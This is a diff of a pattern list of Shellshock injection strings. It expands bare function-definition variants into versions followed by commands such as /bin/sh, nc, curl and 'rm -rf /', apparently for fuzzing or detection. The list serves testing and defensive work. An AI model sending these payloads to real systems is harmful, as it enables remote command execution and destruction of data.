@@ -1,15 +1,46 @@
 () { :;};
-() { :; };
-() { } ;
-() { _; };
 () { :;}; /bin/bash
 () { :;}; echo
 () { :;}; cat
-() { :;}; cat
+() { :;}; nc
 () { :;}; /cat
 () { :;}; curl
 () { :;}; /bin/sh
 () { :;}; rm -rf /
+() { :; };
+() { :; }; /bin/bash
+() { :; }; echo
+() { :; }; cat
+() { :; }; nc
+() { :; }; /cat
+() { :; }; curl
+() { :; }; /bin/sh
+() { :; }; rm -rf /
+() { } ;
+() { }; /bin/bash
+() { }; echo
+() { }; cat
+() { }; nc
+() { }; /cat
+() { }; curl
+() { }; /bin/sh
+() { }; rm -rf /
+() { _; };
+() { _; }; /bin/bash
+() { _; }; echo
+() { _; }; cat
+() { _; }; nc
+() { _; }; /cat
+() { _; }; curl
+() { _; }; /bin/sh
+() { _; }; rm -rf /
+}; /bin/bash
+}; echo
+}; /bin/sh
+}; nc
+}; cat
+}; /cat
+}; rm -rf /
 /usr/bin/env bash
 ifconfig
 -e /bin/sh
